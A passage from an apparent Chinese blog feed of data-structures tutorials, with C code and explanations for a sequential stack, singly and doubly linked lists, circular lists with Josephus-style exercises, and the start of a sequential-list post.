class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n, e;</span><br><span class="line"><span class="type">char</span> chr;</span><br><span class="line">SqStack S;</span><br><span class="line">Initstack(S);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the SqStack:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the element of the SqStack:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">Push(S, e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Whether delete the top of the stack:(y/n)\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;chr);</span><br><span class="line"><span class="keyword">if</span> (chr == <span class="string">&#x27;y&#x27;</span> || chr == <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">Pop(S);</span><br><span class="line"></span><br><span class="line">StackEmpty(S);</span><br><span class="line">StackTraverse(S);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter a decimal number:\n&quot;</span>);</span><br><span class="line">conversion();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>结果展示</strong><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6pm1adf1oj30cu077wgw.jpg"/></div></li></ul><h3 id="SqStack-完整代码地址"><a href="#SqStack-完整代码地址" class="headerlink" title="SqStack 完整代码地址"></a><a href="http:\\chalnl.com\code\sqstack.cpp">SqStack 完整代码地址</a></h3><h2 id="栈的实际应用"><a href="#栈的实际应用" class="headerlink" title="栈的实际应用"></a>栈的实际应用</h2><ol><li><strong>实现浏览器的“回退”功能</strong><blockquote><p>浏览器的“回退”功能底层就是用栈存储结构实现的。</p></blockquote></li><li><p><strong>实现 C 语言函数的相互调用</strong></p><blockquote><p>C语言程序中，函数间的相互调用过程也是用栈存储结构实现的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello,World!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main() 函数先入栈，在第 5 行代码，将 func() 函数入栈。 func() 函数执行完后，func() 函数出栈，此时 main() 函数执行剩余代码， main() 函数执行完毕，出栈操作，程序执行结束。</p></blockquote></li><li><p><strong>解决一些实际问题</strong></p><blockquote><p>快速解决类似“进制转换”、“括号匹配”等问题</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构之链表 - LinkList</title>
      <link href="/post/4110bbe2.html/"/>
      <url>/post/4110bbe2.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="线性表的链式存储结构"><a href="#线性表的链式存储结构" class="headerlink" title="线性表的链式存储结构"></a>线性表的链式存储结构</h1><ul><li><strong>线性表（List）：零个或多个数据元素的有限序列</strong><br>线性表中的每一个元素有且<strong>只有一个直接前驱元素</strong>，除了最后一个元素an外，每一个元素有且<strong>只有一个直接后继元素</strong>。数据元素之间的关系是<strong>一对一的关系</strong>。</li></ul><p><img src="https://img-blog.csdnimg.cn/20210106171800118.png#pic_center" alt="img"></p><h2 id="一-链表"><a href="#一-链表" class="headerlink" title="一. 链表"></a>一. 链表</h2><h3 id="链表基础知识介绍"><a href="#链表基础知识介绍" class="headerlink" title="链表基础知识介绍"></a>链表基础知识介绍</h3><ul><li><p>链表由<strong>数据域</strong>和<strong>指针域</strong>构成<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h69m6wz7kwj306y01rwed.jpg" alt="image.png"></p></li><li><p>链表中<strong>头节点</strong>，<strong>头指针</strong>，<strong>首元节点</strong></p></li><li><strong>data</strong>储存数据，<strong>next</strong>指针指向下一个节点 ，双向链表中<strong>prev</strong>指向上一个节点</li></ul><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h69m0kv9nzj30a104ajrd.jpg" alt="2-1FG915025H28.png"></p><blockquote><p><strong>单链表中可以没有头结点，但是不能没有头指针</strong>！</p></blockquote><p><strong>头结点</strong>：有时，在链表的第一个结点之前会额外增设一个结点，结点的数据域一般不存放数据（有些情况下也可以存放链表的长度等信息），此结点被称为头结点。</p><blockquote><p>若头结点的指针域为空（NULL），表明链表是空表。头结点对于链表来说，不是必须的，在处理某些问题时，给链表添加头结点会使问题变得简单。</p></blockquote><p><strong>首元结点</strong>：链表中第一个元素所在的结点，它是头结点后边的第一个结点。</p><p><strong>头指针</strong>：永远指向链表中第一个结点的位置（如果链表有头结点，头指针指向头结点；否则，头指针指向首元结点）。</p><p><strong>头结点和头指针的区别</strong>：头指针是一个指针，头指针指向链表的头结点或者首元结点；头结点是一个实际存在的结点，它包含有数据域和指针域。两者在程序中的直接体现就是：头指针只声明而没有分配存储空间，头结点进行了声明并分配了一个结点的实际物理内存。</p><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6avvn7k2dj30go03j3yt.jpg" alt="image.png"></p><ul><li><h4 id="单链表代码实现"><a href="#单链表代码实现" class="headerlink" title="单链表代码实现"></a><strong>单链表代码实现</strong></h4></li></ul><ol><li>结构体的创建<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//链表中节点的结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> &#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br></pre></td></tr></table></figure></li><li>初始化链表<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6aw3gnlgjj30jg069ta2.jpg" alt="image.png"></li></ol><ul><li>尾插法创建链表<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_L</span><span class="params">(LinkList&amp; L, <span class="type">int</span> n)</span> &#123;          <span class="comment">//尾插发创建链表</span></span><br><span class="line">L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));     <span class="comment">//创建头结点</span></span><br><span class="line">L-&gt;next = <span class="literal">NULL</span>;                    </span><br><span class="line">LinkList temp = L;                       <span class="comment">//创建头指针  用于遍历</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">LinkList p = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));<span class="comment">//创建结点</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p-&gt;data);           <span class="comment">//写入节点数据</span></span><br><span class="line">temp-&gt;next = p;                  <span class="comment">//连接结点</span></span><br><span class="line">temp = p;                        <span class="comment">//移动头指针</span></span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>头插法创建链表<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_L</span><span class="params">(LinkList&amp; L, <span class="type">int</span> n)</span> &#123;          <span class="comment">//头插发创建链表</span></span><br><span class="line">L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));     <span class="comment">//创建头结点</span></span><br><span class="line">L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">LinkList p = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));<span class="comment">//创建结点</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p-&gt;data);            <span class="comment">//写入节点数据</span></span><br><span class="line">p-&gt;next = L-&gt;next;                <span class="comment">//连接结点</span></span><br><span class="line">L-&gt;next = p;                      <span class="comment">//移动头指针</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ol><li><p>节点的插入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListInsert_L</span><span class="params">(LinkList&amp; L, <span class="type">int</span> i, ElemType e)</span> &#123;  </span><br><span class="line">LinkList temp = L;           <span class="comment">//创建指针指向头结点  用于遍历</span></span><br><span class="line"><span class="type">int</span> j ;</span><br><span class="line"><span class="keyword">for</span> (j=<span class="number">1</span>; j &lt; i; ++j) &#123;      <span class="comment">//遍历找到要插入的前一个结点</span></span><br><span class="line"><span class="keyword">if</span> (temp == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!temp || j &gt; i)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">LinkList p = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));<span class="comment">//申请插入节点的空间</span></span><br><span class="line">p-&gt;data = e;</span><br><span class="line">p-&gt;next = temp-&gt;next;</span><br><span class="line">temp-&gt;next = p;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>结点的删除<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6cc4ypfd1j30jg04c3ze.jpg" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListDelete_L</span><span class="params">(LinkList&amp; L, <span class="type">int</span> i,ElemType e)</span> &#123;  </span><br><span class="line">LinkList temp = L;           <span class="comment">//创建指针指向头结点  用于遍历</span></span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; i; ++j)      <span class="comment">//遍历找到要插入的前一个结点</span></span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (!(temp-&gt;next) || j &gt; i)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">LinkList del = temp-&gt;next;   <span class="comment">//创建指针保存删除的结点</span></span><br><span class="line">temp-&gt;next = del-&gt;next;</span><br><span class="line">e = temp-&gt;data;</span><br><span class="line"><span class="built_in">free</span>(del);                   <span class="comment">//释放要删除结点的空间</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>单链表的输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printList</span><span class="params">(LinkList p)</span> &#123;</span><br><span class="line">LinkList temp = p;       <span class="comment">//将temp指针重新指向头结点</span></span><br><span class="line"><span class="comment">//要temp指针指向的结点的next不是Null，就执行输出语句。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The LinkList is:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp-&gt;next) &#123;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, temp-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>主函数实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n, i, e, j, h;</span><br><span class="line">LinkList p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the linklist:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the element of the linklist:\n&quot;</span>);</span><br><span class="line">CreateList_L(p, n);</span><br><span class="line">printList(p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the position to insert:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the elements:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">ListInsert_L(p, i, e);</span><br><span class="line">printList(p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nPlease input the position to delete:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;j);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the elements:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;h);</span><br><span class="line">ListDelete_L(p, j, h);</span><br><span class="line">printList(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>结果展示</strong><br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6cb31lrp8j30gd0audjg.jpg" alt="image.png"></li></ul><h4 id="单链表完整代码地址"><a href="#单链表完整代码地址" class="headerlink" title="单链表完整代码地址"></a><a href="http:\\chalnl.com\code\linklist.cpp">单链表完整代码地址</a></h4><h3 id="二-双向列表"><a href="#二-双向列表" class="headerlink" title="二. 双向列表"></a>二. 双向列表</h3><ul><li><strong>在学会单链表的前提下，双向链表简直不要太简单。</strong></li></ul><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6avwjrfcwj30go02cjrj.jpg" alt="image.png"></p><ol><li>指针域：用于指向当前节点的直接前驱节点；</li><li>数据域：用于存储数据元素。</li><li>指针域：用于指向当前节点的直接后继节点；<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6avx0jodpj307k01jdg2.jpg" alt="image.png"></li></ol><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><ol><li><p>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> &#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">prior</span>;</span>  <span class="comment">//指向直接前趋</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">next</span>;</span>   <span class="comment">//指向直接后继</span></span><br><span class="line">&#125;DuLNode,*DuLLinkList;</span><br></pre></td></tr></table></figure></li><li><p>双向链表的创建（尾插发）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_DuL</span><span class="params">(DuLLinkList&amp; L, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">L = (DuLLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DuLNode));</span><br><span class="line">L-&gt;next = <span class="literal">NULL</span>;                    </span><br><span class="line">DuLLinkList temp = L; </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">DuLLinkList p = (DuLLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DuLNode));</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p-&gt;data);</span><br><span class="line">temp-&gt;next = p; </span><br><span class="line">temp-&gt;next-&gt;prior = temp;</span><br><span class="line">temp = p; </span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>双向链表中结点的插入<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6j1h2c3tfj30fa051q3b.jpg" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListInsert_DuL</span><span class="params">(DuLLinkList&amp; L, <span class="type">int</span> i, ElemType e)</span> &#123;</span><br><span class="line">DuLLinkList temp = L;</span><br><span class="line"><span class="type">int</span> j ;</span><br><span class="line"><span class="keyword">for</span> (j=<span class="number">1</span>; j &lt; i; ++j) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!temp || j &gt; i)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">DuLLinkList p = (DuLLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DuLNode));</span><br><span class="line">p-&gt;data = e;</span><br><span class="line">p-&gt;prior = temp;</span><br><span class="line">p-&gt;next = temp-&gt;next;</span><br><span class="line">temp-&gt;next-&gt;prior = p;</span><br><span class="line">temp-&gt;next = p;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>双向链表中结点的删除<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6j1g93unmj30go0310t6.jpg" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListDelete_DuL</span><span class="params">(DuLLinkList&amp; L, <span class="type">int</span> i,ElemType e)</span> &#123;</span><br><span class="line">DuLLinkList temp = L;</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; i; ++j) </span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (!(temp-&gt;next) || j &gt; i)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">DuLLinkList del = temp-&gt;next;</span><br><span class="line">temp-&gt;next-&gt;next-&gt;prior = temp;</span><br><span class="line">temp-&gt;next = temp-&gt;next-&gt;next;</span><br><span class="line">e = del-&gt;data;</span><br><span class="line"><span class="built_in">free</span>(del);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>结果展示</strong><br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6j0wjvhi2j30g90aogpe.jpg" alt="image.png"></li></ul><h4 id="双向链表完整代码地址"><a href="#双向链表完整代码地址" class="headerlink" title="双向链表完整代码地址"></a><a href="http:\\chalnl.com\code\DulLinklist.cpp">双向链表完整代码地址</a></h4><h3 id="三-循环列表"><a href="#三-循环列表" class="headerlink" title="三. 循环列表"></a>三. 循环列表</h3><p>循环链表只需要将表中最后一个结点的指针指向头结点，链表就能成环儿<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h69muhpt7kj310y08bjsc.jpg" alt="image.png"></p><ul><li><p>循环链表解决<strong>约瑟夫环</strong>问题<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6cc7lw0ooj30b40950t0.jpg" alt="image.png"></p></li><li><ol><li><a href="http:\\chalnl.com\code\linklist1.cpp">猴子选大王</a><blockquote><p>有 n 只猴子围成一圈，从 1 - n 编号，大家决定从中选出一个大王。经过协商，决定选大王的规则为：从编号为1的猴子开始报数，报到 k 的猴子出圈，然后再从下一只开始继续报 1 到 k ……，最后剩下来的那一只就是大王。要求编程从键盘输入 n、k ，输出成为大王的猴子编号。</p></blockquote></li></ol></li><li><ol><li><a href="http:\\chalnl.com\code\linklist2.cpp">约瑟夫杯2</a><blockquote><p>围绕着山顶有10个圆形排列的洞，狐狸要吃兔子，兔子说：“可以，但必须先找到我，我就藏身于这十个洞中的某个洞。你从1号洞找，下次隔1个洞（即3号洞）找，第三次隔2个洞（即6号洞）找，再隔3个…以后在这个圆圈中如此类推，次数不限。”但狐狸从早到晚进进出出了1000次，仍没有找到兔子。问：兔子可能在哪个洞里？编写程序找出。</p></blockquote></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构之顺序表 - SqList</title>
      <link href="/post/91054329.html/"/>
      <url>/post/91054329.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="线性表的顺序存储结构"><a href="#线性表的顺序存储结构" class="headerlink" title="线性表的顺序存储结构"></a>线性表的顺序存储结构</h1><ul><li><strong>线性表（List）：零个或多个数据元素的有限序列</strong><br>线性表中的每一个元素有且<strong>只有一个直接前驱元素</strong>，除了最后一个元素an外，每一个元素有且<strong>只有一个直接后继元素</strong>。数据元素之间的关系是<strong>一对一的关系</strong>。</li></ul><p><img src="https://img-blog.csdnimg.cn/20210106171800118.png#pic_center" alt="img"></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul><li>typedef struct 解释详解<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span>                  <span class="comment">//类型定义，给结构体定义一个名字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span>                   //结构体定义</span></span><br><span class="line"><span class="class"><span class="title">typedef</span> <span class="keyword">struct</span>           //使用这个结构体方便</span></span><br><span class="line"><span class="class"><span class="title">typedef</span> <span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> elem;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;NODE;                   <span class="comment">//定义结构体</span></span><br></pre></td></tr></table></figure></li><li>malloc()函数<blockquote><p>malloc（）是动态内存分配函数，用来向系统请求分配内存空间</p></blockquote></li></ul><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><ol><li><strong>概念</strong>：用一组<strong>地址连续</strong>的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。</li><li><strong>特点</strong>：逻辑上相邻的数据元素，物理次序也是相邻的</li></ol><p>线性表的顺序存储结构是一种随机存取的储存结构</p><h3 id="顺序表时间复杂度"><a href="#顺序表时间复杂度" class="headerlink" title="顺序表时间复杂度"></a>顺序表时间复杂度</h3><p>从以上代码可以很明显的看出，线性表的顺序存储结果在读、存数据是的时间复杂度是<strong>O(1)</strong>，<strong>插入、删除</strong>操作的时间复杂度是<strong>O(n)</strong>。</p><h3 id="顺序表的优缺点"><a href="#顺序表的优缺点" class="headerlink" title="顺序表的优缺点"></a>顺序表的优缺点</h3><ol><li><p><strong>优点</strong>：无须为表中元素之间的逻辑关系而增加额外的存储空间；<strong>可以快速的存取表中任一位置的元素</strong>。</p></li><li><p><strong>缺点</strong>：插入和删除操作需要移动大量元素；当线性表长度较大时，难以确定存储空间的容量；造成存储空间的“碎片”。</p></li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><ol><li><p>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>      <span class="comment">//顺序表数据结构</span></span><br><span class="line">    ElemType* elem;</span><br><span class="line">    <span class="type">int</span> length;      <span class="comment">//记录当前顺序表的长度</span></span><br><span class="line">    <span class="type">int</span> listsize;    <span 